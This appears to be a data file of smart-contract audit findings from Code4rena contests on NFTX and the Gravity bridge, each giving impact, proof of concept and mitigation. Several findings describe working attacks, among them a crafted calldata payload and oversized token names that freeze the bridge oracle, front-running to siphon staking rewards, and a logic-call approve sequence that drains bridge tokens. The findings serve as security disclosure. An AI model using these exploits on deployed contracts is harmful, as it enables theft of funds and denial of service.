
Anyone can create a pool and get people to join. If there is a big deposit admin could front-run the transaction and set the fee to max which is uint(1 ether) = 10\*\*18 (100% as this is a per token fee).

Function that set fees :
<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L119>
Max fees are 1 ether :
<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultFactoryUpgradeable.sol#L122>

The manager could benefit from this by having other pool assets deposited in staking so he would receive fees in Vtokens and could use them to withdraw the nfts.

#### Recommended Mitigation Steps

Add a timelock to change fees. In that way, frontrunning wouldn't be possible and users would know the fees they are agreeing with.





***"
69.md,`xToken` Approvals Allow Spenders To Spend More Tokens,medium,"The `approve` function has not been overridden and therefore uses `xToken` shares instead of the equivalent rebalanced amount, i.e. the underlying vault token amount.

#### Proof of Concept

The approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing as rewards continue to be distributed to the `XTokenUpgradeable` contract.

Many contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).

#### Recommended Mitigation Steps

The `_allowances` field should track the rebalanced amounts (i.e. the equivalent vault token amount) such that the approval value does not grow.

The `transferFrom` needs to be overridden and approvals should then be subtracted by the transferred vault token `amount`, not `shares`.





***"
69.md,Rewards can be stolen,medium,"The `NFTXInventoryStaking` contract distributes new rewards to all previous stakers when the owner calls the `receiveRewards` function.
This allows an attacker to frontrun this `receiveRewards` transaction when they see it in the mem pool with a `deposit` function.
The attacker will receive the rewards pro-rata to their deposits.
The deposit will be locked for 2 seconds only (`DEFAULT_LOCKTIME`) after which the depositor can withdraw their initial deposit & the rewards again for a profit.

The rewards can be gamed this way and one does not actually have to *stake*, only be in the staking contract at the time of reward distribution for 2 seconds.
The rest of the time they can be used for other purposes.

#### Recommended Mitigation Steps

Distribute the rewards equally over time to the stakers instead of in a single chunk on each `receiveRewards` call.
This is more of a ""streaming rewards"" approach.




***"
69.md,Low-level call return value not checked,medium,"The `NFTXStakingZap.addLiquidity721ETHTo` function performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeded.

#### Impact

If the call fails, the refunds did not succeed and the caller will lose all refunds of `msg.value - amountEth`.

#### Recommended Mitigation Steps

Revert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.






***"
69.md,Bypass zap timelock,medium,"The default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. These timelock value are used in `NFTXInventoryStaking` to eventually call `_timelockMint` in `XTokenUpgradeable`.

<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L74>

```solidity
function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {
  uint256 timelockFinish = block.timestamp + timelockLength;
  timelock[account] = timelockFinish;
  emit Timelocked(account, timelockFinish);
  _mint(account, amount);
}
```

The applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. Therefore, one can reduce their long (e.g. 7 days) timelock to 2 ms calling `deposit` in `NFTXInventoryStaking`

#### Proof of Concept

<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L160>
<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L30>

#### Recommended Mitigation Steps

```solidity
function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {
  uint256 timelockFinish = block.timestamp + timelockLength;
  if(timelockFinish > timelock[account]){
    timelock[account] = timelockFinish;
    emit Timelocked(account, timelockFinish);
  }
  _mint(account, amount);
}
```








***"
69.md,NFTXSimpleFeeDistributor._sendForReceiver doesn't return success if receiver is not a contract,medium,"Double spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones.
As `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.

#### Proof of Concept

`distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`:
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67>

`_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed.
When `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done:
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168>

This way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice:
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64>

#### Recommended Mitigation Steps

Now:

```solidity
function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {
  if (_receiver.isContract) {
  ...
  } else {
    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
  }
}
```

To be:
```solidity
function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {
  if (_receiver.isContract) {
  ...
  } else {
    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
    return true;
  }
}
```





***"
69.md,NFTXVaultFactoryUpgradeable implementation can be replaced in production breaking the system,medium,"`NFTXVaultFactory` contract holds information regarding vaults, assets and permissions (vaults, \_vaultsForAsset and excludedFromFees mappings).
As there is no mechanics present that transfers this information to another implementation, the switch of nftxVaultFactory to another address performed while in production will break the system.

#### Proof of Concept

`setNFTXVaultFactory` function allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts:

NFTXLPStaking
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L59>

NFTXInventoryStaking
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L51>

NFTXSimpleFeeDistributor
<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L135>

#### Recommended Mitigation Steps

Either restrict the ability to change the factory implementation to pre-production stages or make `nftxVaultFactory` immutable by allowing changing it only once:

Now:
```solidity
function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {
  require(newFactory != address(0));
  nftxVaultFactory = INFTXVaultFactory(newFactory);
}
```

To be:
```solidity
function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {
  require(nftxVaultFactory == address(0), ""nftxVaultFactory is immutable"");
  nftxVaultFactory = INFTXVaultFactory(newFactory);
}
```

If the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.






***"
69.md,`buyAndSwap1155WETH` Does Not Work As Intended,medium,"The `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314>

```solidity
function buyAndSwap1155WETH(
  uint256 vaultId, 
  uint256[] memory idsIn, 
  uint256[] memory amounts, 
  uint256[] memory specificIds, 
  uint256 maxWethIn, 
  address[] calldata path,
  address to
) public payable nonReentrant {
  require(to != address(0));
  require(idsIn.length != 0);
  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);
  uint256 count;
  for (uint256 i = 0; i < idsIn.length; i++) {
      uint256 amount = amounts[i];
      require(amount > 0, ""Transferring < 1"");
      count += amount;
  }
  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));
  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (
      vault.randomSwapFee() * (count - specificIds.length)
  );
  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);
  _swap1155(vaultId, idsIn, amounts, specificIds, to);

  emit Swap(count, swapAmounts[0], to);

  // Return extras.
  uint256 remaining = WETH.balanceOf(address(this));
  WETH.transfer(to, remaining);
}
```

#### Tools Used

Manual code review.
Discussions with Kiwi.

#### Recommended Mitigation Steps

Consider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).

    uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);





***"
69.md,Dishonest Stakers Can Siphon Rewards From `xToken` Holders Through The `deposit` Function In `NFTXInventoryStaking`,medium,"`xTokens` is intended to be a representation of staked vault tokens. As the protocol's vaults accrue fees from users, these fees are intended to be distributed to users in an inconsistent fashion. `NFTXInventoryStaking` is one of the ways users can stake vault tokens. Deposits are timelocked for `2` seconds by default, essentially rendering flash loan attacks redundant. However, it is more than likely that the same user could withdraw their `xToken` deposit in the next block (assuming an average block time of just over 13 seconds).

Hence, if a well-funded attacker sees a transaction to distribute rewards to `xToken` holders, they could deposit a large sum of vault tokens and receive a majority share of the rewards before withdrawing their tokens in the following block. Additionally, the attacker can force distribute rewards in `NFTXSimpleFeeDistributor` as there is no access control on the `distribute` function.

This issue allows users to siphon user's rewards from the protocol, intended to be distributed to honest vault token stakers.

#### Proof of Concept

Consider the following exploit scenario:

*   Currently there are 1000 `shares` and 1000 `base tokens` in the `XTokenUpgradeable` contract.
*   Honest actor, Alice, calls `distribute` in `NFTXSimpleFeeDistributor` which attempts to send 200 `base tokens` as rewards for `xToken` holders accrued via protocol usage.
*   Bob sees a transaction to reward `xToken` holders and frontruns this transaction by staking vault tokens, minting 1000 `shares` and 1000 `base tokens`.
*   Rewards are distributed such that `XTokenUpgradeable` has 2000 `shares` and 2200 `base tokens`.
*   Bob unstakes his tokens and exits the pool, redeeming his 1000 `shares` for 1100 `base tokens`.
*   As a result, Bob was able to siphon off 100 `base tokens` without having to stake their tokens for the same time period that Alice had staked her tokens for.
*   This unfair distribution can be abused again and again to essentially reward dishonest actors over honest staking participants such as Alice.

#### Tools Used

Manual code review.
Discussions with Kiwi.

#### Recommended Mitigation Steps

Consider adding a delay to users token deposits into the `XTokenUpgradeable` such that miners cannot feasibly censor a transaction for the specified time interval and users cannot frontrun a transaction to distribute rewards. The interval should be chosen such that enough time is provided for the transaction to be included in a block, given poor network conditions.

I.e. If the chosen interval is 20 blocks. Miners must be able to censor the rewards distribution for 20 blocks. This is unlikely as there would need to be sufficient miner collusion for value to be extracted from the protocol. Additionally, an interval of 20 blocks means that stakers who attempt to enter the pool upon seeing the transaction in the mempool won't be rewarded for such behaviour.

It is also essential that the `distribute` function in `NFTXSimpleFeeDistributor` is restricted to a given role, ensuring malicious users cannot control at what point rewards are distributed.

Alternatively, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as [reference](https://v4.docs.pooltogether.com/protocol/concepts/time-weight-average-balance/). This would ensure the fairest distribution of rewards to stakers, however, there are additional gas costs associated with this implementation. Hence, unless the protocol intends to be used primarily on L2 protocols, this solution should be avoided.





***"
69.md,Return variable can remain unassigned in _sendForReceiver,medium,"The `_sendForReceiver()` function only sets a return function in the ""if"" code block, not the ""else"" case. If the ""else"" case is true, no value is returned. The result of this oversight is that the `_sendForReceiver()` function called from the `distribute()` function could sucessfully enter its `else` block if a receiver has `isContract` set to False and successfully transfer the `amountToSend` value. The `ditribute()` function will then have `leftover > 0` and send `currentTokenBalance` to the treasury. This issue is partially due to [Solidity using implicit returns](https://github.com/ethereum/solidity/issues/2951), so if no bool value is explicitly returned, the default bool value of False will be returned.

This problem currently occurs for any receiver with `isContract` set to False. The `_addReceiver` function allows for `isContract` to be set to False, so such a condition should not result in tokens being sent to the treasury as though it was an emergency scenario.

#### Proof of Concept

The `else` block is missing a return value
<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L167-L169>

#### Tools Used

VS Code ""Solidity Visual Developer"" extension

#### Recommended Mitigation Steps

Verify that functions with a return value do actually return a value in all cases. Adding the line `return true;` can be added to the end of the `else` block as one way to resolve this.

Alternatively, if `isContract` should never be set to False, the code should be designed to prevent a receiver from being added with this value.





***"
69.md,No access control on assignFees() function in NFTXVaultFactoryUpgradeable contract,medium,"If the Vault owner decides to set factoryMintFee and factoryRandomRedeemFee to zero, any user could call the function NFTXVaultFactoryUpgradeable.assignFees() and hence all the fees are updated.






***"
69.md,Malicious receiver can make distribute function denial of service,medium,"In the NFTXSimpleFeeDistributor.sol contract, the distribute function calls the \_sendForReceiver function to distribute the fee

```solidity
function distribute(uint256 vaultId) external override virtual nonReentrant {
  require(nftxVaultFactory != address(0));
  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);

  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));

  if (distributionPaused || allocTotal == 0) {
    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);
    return;
  }

  uint256 length = feeReceivers.length;
  uint256 leftover;
  for (uint256 i = 0; i <length; i++) {
    FeeReceiver memory _feeReceiver = feeReceivers[i];
    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);
    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));
    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;
    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);
    if (!complete) {
      leftover = amountToSend;
    } else {
      leftover = 0;
    }
  }
```

In the \_sendForReceiver function, when the \_receiver is a contract, the receiver's receiveRewards function will be called. If the receiver is malicious, it can execute revert() in the receiveRewards function, resulting in DOS.

```solidity
function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {
  if (_receiver.isContract) {
    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);
    // If the receive is not properly processed, send it to the treasury instead.
      
    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);
    (bool success,) = address(_receiver.receiver).call(payload);

    // If the allowance has not been spent, it means we can pass it forward to next.
    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;
  } else {
    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);
  }
}
```

#### Proof of Concept

<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L166>

#### Recommended Mitigation Steps

The contract can store the fee sent to the receiver in a state variable, and then the receiver can take it out by calling a function.







***"
69.md,transfer return value is ignored,medium,"Need to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/transferFrom method doesn’t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must

1.  Check the transfer return value

Another popular possibility is to add a whiteList.
Those are the appearances (solidity file, line number, actual line):

```solidity
NFTXStakingZap.sol, 401, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); 
NFTXStakingZap.sol, 474, IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this))); 
PalmNFTXStakingZap.sol, 190, pairedToken.transferFrom(msg.sender, address(this), wethIn); 
PalmNFTXStakingZap.sol, 195, pairedToken.transfer(to, wethIn-amountEth); 
PalmNFTXStakingZap.sol, 219, pairedToken.transferFrom(msg.sender, address(this), wethIn); 
PalmNFTXStakingZap.sol, 224, pairedToken.transfer(to, wethIn-amountEth); 
PalmNFTXStakingZap.sol, 316, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); 
XTokenUpgradeable.sol, 54, baseToken.transfer(who, what); 
NFTXFlashSwipe.sol, 51, IERC20Upgradeable(vault).transferFrom(msg.sender, address(this), mintFee + targetRedeemFee);
```







***"
27.md,Cannot actually submit evidence,high,"### Impact
The `SubmitBadSignatureEvidence` is not actually registered in the handler and hence no one can actually submit this message, rendering the message useless. This harms the security model of Gravity since validators have no disincentive to attempt to collude and take over the bridge.

### Proof of Concept
The `SubmitBadSignatureEvidence` handler is omitted from `module`/`x`/`gravity`/`handler.go`

### Tools Used
Visual inspection

### Recommended Mitigation Steps
Handle the `MsgSubmitBadSignatureEvidence` in `module`/`x`/`gravity`/`handler.go`"
27.md,Freeze Bridge via Non-UTF8 Token Name/Symbol/Denom,high,"Manual insertion of non-utf8 characters in a token name will break parsing of logs and will always result in the oracle getting in a loop of failing and early returning an error. The fix is non-trivial and likely requires significant redesign.

### Proof of Concept
Note the `c0` in the last argument of the call data (invalid UTF8).

It can be triggered with:

```solidity
data memory bytes = hex""f7955637000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000461746f6d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046e616d6500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000673796d626fc00000000000000000000000000000000000000000000000000000"";
gravity.call(data);
```

The log output is as follows:
```solidity
    ERC20DeployedEvent(""atom"", ""name"", ❮utf8 decode failed❯: 0x73796d626fc0, 18, 2)
```

Which hits [this code path](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/gravity_utils/src/types/ethereum_events.rs#L431-L438):

```rust
    let symbol = String::from_utf8(input.data[index_start..index_end].to_vec());
    trace!(""Symbol {:?}"", symbol);
    if symbol.is_err() {
        return Err(GravityError::InvalidEventLogError(format!(
            ""{:?} is not valid utf8, probably incorrect parsing"",
            symbol
        )));
    }
```

And would cause an early return [here](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/orchestrator/src/ethereum_event_watcher.rs#L99):

```rust
let erc20_deploys = Erc20DeployedEvent::from_logs(&deploys)?;
```

Never updating last checked block and therefore, this will freeze the bridge by disallowing any attestations to take place. This is an extremely low cost way to bring down the network.

#### Recommendation
This is a hard one. Re-syncing is permanently borked because, on the Go side, there is seemingly no way to ever process the event nonce because protobufs do not handle non-utf8 strings. The validator would report they need event nonce `N` from the orchestrator, but they can never parse the event `N`. Seemingly, validators & orchestrators would have to know to ignore that specific event nonce. But it is a permissionless function, so it can be used to effectively permanently stop attestations & the bridge until a new `Gravity.sol` is deployed.

One potential fix is to check in the solidity contract if the name contains valid utf8 strings for denom, symbol and name. This likely will be expensive though. Alternatively, you could require that validators sign ERC20 creation requests and perform checks before the transaction is sent."
27.md,Freeze The Bridge Via Large ERC20 Names/Symbols/Denoms,high,"Ethereum Oracles watch for events on the `Gravity.sol` contract on the Ethereum blockchain. This is performed in the [`check_for_events`](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/orchestrator/src/ethereum_event_watcher.rs#L23) function, and run in the [`eth_oracle_main_loop`](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/orchestrator/src/main_loop.rs#L94).

In this function, there is [the following code snippet](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/orchestrator/src/ethereum_event_watcher.rs#L66-L73):

```rust
let erc20_deployed = web3
    .check_for_events(
        starting_block.clone(),
        Some(latest_block.clone()),
        vec![gravity_contract_address],
        vec![ERC20_DEPLOYED_EVENT_SIG],
    )
    .await;
```

This snippet leverages the `web30` library to check for events from the `starting_block` to the `latest_block`. Inside the `web30` library this nets out to calling:

```rust
pub async fn eth_get_logs(&self, new_filter: NewFilter) -> Result<Vec<Log>, Web3Error> {
    self.jsonrpc_client
        .request_method(
            ""eth_getLogs"",
            vec![new_filter],
            self.timeout,
            Some(10_000_000),
        )
        .await
}
```

The `10_000_000` specifies the maximum size of the return in bytes and returns an error if the return is larger:

```rust
let res: Response<R> = match res.json().limit(limit).await {
    Ok(val) => val,
    Err(e) => return Err(Web3Error::BadResponse(format!(""Web3 Error {}"", e))),
};
```

This can be triggered at will and keep the loop in a perpetual state of returning the `GravityError::EthereumRestError(Web3Error::BadResponse(
            ""Failed to get logs!"".to_string()))` error. To force the node into this state, you just have to deploy ERC20s generated by the [public function in `Gravity.sol`](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L546-L565):

```solidity
function deployERC20(
    string memory _cosmosDenom,
    string memory _name,
    string memory _symbol,
    uint8 _decimals
) public {
    // Deploy an ERC20 with entire supply granted to Gravity.sol
    CosmosERC20 erc20 = new CosmosERC20(address(this), _name, _symbol, _decimals);

    // Fire an event to let the Cosmos module know
    state_lastEventNonce = state_lastEventNonce.add(1);
    emit ERC20DeployedEvent(
        _cosmosDenom,
        address(erc20),
        _name,
        _symbol,
        _decimals,
        state_lastEventNonce
    );
}
```

And specify a large string as the denom, name, or symbol.

If an attacker uses the denom as the attack vector, they save significant gas costing just 256 per additional 32 bytes. For other cases, to avoid gas overhead, you can have the string be mostly 0s resulting in just 584 gas per additional 32 bytes. This leaves it feasible to surpass the 10mb response data in the 6 block buffer. This would throw every ethereum oracle into a state of perpetual errors and all would fall out of sync with the ethereum blockchain. This would result in the batches, logic calls, deposits, ERC20 creations, and `valset` updates to never receive attestations from other validators because their ethereum oracles would be down; the bridge would be frozen and remain frozen until the bug is fixed due to `get_last_checked_block`.

This will freeze the bridge by disallowing attestations to take place.

This requires a patch to reenable the bridge.

#### Recommendation
Handle the error more concretely and check if you got a byte limit error. If you did, chunk the search size into 2 and try again. Repeat as necessary, and combine the results.

Additionally, you could require that validators sign ERC20 creation requests."
27.md,Large Validator Sets/Rapid Validator Set Updates May Freeze the Bridge or Relayers,high,"In a similar vein to ""Freeze The Bridge Via Large ERC20 Names/Symbols/Denoms"", a sufficiently large validator set or sufficiently rapid validator update, could cause both the `eth_oracle_main_loop` and `relayer_main_loop` to fall into a state of perpetual errors. In `find_latest_valset`, [we call](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/orchestrator/relayer/src/find_latest_valset.rs#L33-L40):

```rust
let mut all_valset_events = web3
    .check_for_events(
        end_search.clone(),
        Some(current_block.clone()),
        vec![gravity_contract_address],
        vec![VALSET_UPDATED_EVENT_SIG],
    )
    .await?;
```

Which if the validator set is sufficiently large, or sufficiently rapidly updated, continuoussly return an error if the logs in a 5000 (see: `const BLOCKS_TO_SEARCH: u128 = 5_000u128;`) block range are in excess of 10mb. Cosmos hub says they will be pushing the number of validators up to 300 (currently 125). At 300, each log would produce 19328 bytes of data (4\*32+64\*300). Given this, there must be below 517 updates per 5000 block range otherwise the node will fall out of sync.

This will freeze the bridge by disallowing attestations to take place.

This requires a patch to reenable the bridge.

#### Recommendation

Handle the error more concretely and check if you got a byte limit error. If you did, chunk the search size into 2 and try again. Repeat as necessary, and combine the results."
27.md,The function `updateValset` does not have enough sanity checks,medium,"In the [updateValset](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L224) function, the current set of validators adds a new set.

It is missing the check that the combined power of all new validators is above the `state_powerThreshold`. If this is false, then the contract is effectively stuck. Consider adding an on-chain check for this.

It is also worth adding a that the size of the new validator check is less than a certain number.

Here is a rough calculation explaining how 10000 validators (an extreme example) is too much:

1.  Let us say that the new set of validators have the property that at least, say, `N` validators are needed to get the total threshold above `state_powerThreshold`.
2.  Since each validating signature requires a call to `ecrecover`, costing at least `3000` gas, the minimum gas needed for getting a proposal over `state_powerThreshold` would be `N * 3000`
3.  `N * 3000` cannot be more than the `block.gaslimit` Currently, this puts `N` to be less than `10000`

Another approach to solve the above potential problems is to do the updating as a two step process:

1.  The current set of validators proposes a pending set of validators.
2.  And the pending set of validators need to do the transition to become the new set of validators. Going through the same threshold checks.

This guarantees that the new set of validators has enough power to pass threshold and doesn't have gas limit issues in doing so."
27.md,Crash Eth Oracle On Any `LogicCallEvent`,medium,"Likelihood: high

In `eth_oracle_main_loop`, `get_last_checked_block` is called. Followed by:

```rust
let logic_call_executed_events = web3
    .check_for_events(
        end_search.clone(),
        Some(current_block.clone()),
        vec![gravity_contract_address],
        vec![LOGIC_CALL_EVENT_SIG],
    )
    .await;
```

and may hit the code path:

```rust
for event in logic_call_executed_events {
    match LogicCallExecutedEvent::from_log(&event) {
        Ok(call) => {
            trace!(
                ""{} LogicCall event nonce {} last event nonce"",
                call.event_nonce,
                last_event_nonce
            );
            if upcast(call.event_nonce) == last_event_nonce && event.block_number.is_some()
            {
                return event.block_number.unwrap();
            }
        }
        Err(e) => error!(""Got ERC20Deployed event that we can't parse {}"", e),
    }
}
```

But will panic at `from_log` here:

```rust
impl LogicCallExecutedEvent {
    pub fn from_log(_input: &Log) -> Result<LogicCallExecutedEvent, GravityError> {
        unimplemented!()
    }
    // snip...
}
```

It can/will also be triggered here in `check_for_events`:

```rust
let logic_calls = LogicCallExecutedEvent::from_logs(&logic_calls)?;
```

Attestations will be frozen until patched.

#### Recommendation
Implement the method."
27.md,Win all relayer rewards,medium,"""Large Validator Sets/Rapid Validator Set Updates May Freeze the Bridge or Relayer"" can affect just the relayers & not affect the oracle in certain circumstances. This could result in valid attestations, but prevent any of the other relayers from being able to participate in the execution. While the other relayers are down from the other attack, the attacker can win all batch, logic, and valset rewards as their node is the only relayer running. This is possible because `find_latest_valset` is run in the main relayer loop and everytime tries for 5000 blocks of logs."
27.md,Incorrect accounting on transfer-on-fee/deflationary tokens in `Gravity`,medium,"#### Impact
The `sendToCosmos` function of `Gravity` transfers `_amount` of `_tokenContract` from the sender using the function `transferFrom`. If the transferred token is a transfer-on-fee/deflationary token, the actually received amount could be less than `_amount`. However, since `_amount` is passed as a parameter of the `SendToCosmosEvent` event, the Cosmos side will think more tokens are locked on the Ethereum side.

#### Proof of Concept
Referenced code:
* [Gravity.sol#L535](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L535)
* [Gravity.sol#L541](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L541)

#### Recommended Mitigation Steps

Consider getting the received amount by calculating the difference of token balance (using `balanceOf`) before and after the `transferFrom`."
27.md,Direct usage of `ecrecover` allows signature malleability,low,"#### Impact
The `verifySig` function of `Gravity` calls the Solidity `ecrecover` function directly to verify the given signatures. However, the `ecrecover` EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks.

Although a replay attack seems not possible here since the nonce is increased each time, ensuring the signatures are not malleable is considered a best practice (and so is checking `_signer != address(0)`, where `address(0)` means an invalid signature).

#### Proof of Concept

Referenced code:
[Gravity.sol#L153](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L153)

[SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117)
[SWC-121: Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)

#### Recommended Mitigation Steps

Use the `recover` function from [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification."
27.md,Why nonces are not incrementing by 1 ?,low,"#### Impact
I am concerned why `invalidationId`, `invalidationNonce` or `valsetNonce` are only required to be greater than the previous value. Why did you choose this approach instead of just simply asking for an incremented value? While this may not be a problem if the validators are honest, but otherwise, they may submit a nonce of MAX UINT and thus block the whole system as it would be no longer possible to submit a greater value. Again, just wanted you to be aware of this issue, not sure how likely this to happen is in practice, it depends on the honesty of validators so you better know.

#### Recommended Mitigation Steps

I didn't receive an answer on Discord so decided to submit this FYI to decide if that's a hazard or no."
27.md,logic calls can steal tokens,low,"#### Impact
Attacker can send a logic call that performs a `token.approve(attackerAddress, type(uint256).max)` using the `submitLogicCall` function.

Afterwards, they can steal all tokens from the bridge using `token.safetransferfrom(bridge, attacker, amount)`.

#### Proof of Concept
*   `submitLogicCall` with `token.approve(attackerAddress, type(uint256).max)`
*   call `token.safetransferfrom(bridge, attacker, amount)`

#### Recommended Mitigation Steps
Disallow calls to the bridge contract, or to any token/NFT contracts that the bridge owns tokens of (`token.balanceOf(address(this)) > 0`)."
